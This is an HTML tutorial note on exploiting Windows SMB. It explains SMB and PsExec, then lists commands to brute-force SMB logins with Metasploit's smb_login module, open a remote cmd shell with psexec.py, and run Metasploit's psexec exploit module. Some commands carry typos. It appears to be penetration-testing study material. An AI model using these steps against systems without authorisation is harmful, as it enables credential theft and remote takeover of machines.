<h1>Exploiting SMB with PsExec</h1>
<h2>SMB</h2>
<ul>
  <li>SMB(Server Message Block) is a network file sharing protocol that is used to faciliate the sharing of files and peripherals (printers and serial ports) between computers on local network(LAN)</li>
  <li>SMB uses port 445 (TCP). However originally, SMB ran on top of NetBIOS using port 139.</li>
  <li>SAMBA is the open source Linux implementation of SMB, and allows Windows system to access Linux shares and device.</li>
</ul>
<h2>SMB Authentication</h2>
<ul>
  <li>The SMB protocol utilizes two levels of authentication, namely:</br>1. User Authentication</br>2. Share Authentication</li>
  <li>User authentication - User must provide a username and password in order to authenticate with the SMB server in order to access a share.</li>
  <li>Share authentication - Users must provide a password in order to access restricated share.</li>
</ul>
Note: Both of these authentication levels utilize a challenge response authentication system.
<h2>PsExec</h2>
<ul>
  <li>PsExec is a lightweight telnet - replacement developed by microsoft that allows you execute porcesses on remote windows system using any user's credentials.</li>
  <li>PsExec authentication is performed via SMB.</li>
  <li>We can use the PsExec utility to authenticate with the target system legitimately and run arbitary commands or launch a remote command prompt.</li>
  <li>It is very similar to RDP, however, instead of controlling the remote system via GUI, command are sent via CMD.</li>
</ul>
<h2>SMB Exploitatin with PsExec</h2>
<ul>
  <li>In order to utilize PsExec to gain access to a windows target, we will need to identify legitimate user accounts and their respective passwords or passwrod hashes.</li>
  <li>This can be done by leveraging various tools and techniques, however, the most common technique will involve performing and SMB login brute-force attack.</li>
  <li>We can narrow down our brute-force attack to only include common Windows user accounts like: <br>-Administrator</li>
  <li>After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.</li>
</ul>

<hr>
<h3>Nmap Scan</h3>
<code>nmap -Sv -sC {ip}</code>
<h3>SMB brute force</h3>
<code>service postgresql start && msfconsole</code></br>
<span>After running msfconsole</span></br>
<code>search smb_login</code></br>
<code>use auxiliary/scanner/smb/smn_login</code></br>
<code>show options</code></br>
<code>set USER_FILE /usr/shar/metaspolit-framework/data/wordlists/common_user.txt</code></br>
<code>set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt</code></br>
<code>set RHOST {ip}</code></br>
<span>It will not show all atempts, only show found password</span><br><code>set VERBOSE false</code>
<h3>Now in new terminal</h3>
<code>psexec.py Administrator@{ip} cmd.exe</code></br>
Now it will prompt to enter passwrod, so enter password which you got form bruteforce<br>
After entering password, We can get cmd 
<br>
<hr>
<h3>exploiting form metasploit</h3><br>
1. search psexec<br>
2. use exploit/windows/smb/psexec
3. set RHOSTS
4. set SMBUser 
5. set SMBPass 
<br>
It may detect my windows defender because it send payload and then it will provide you session 






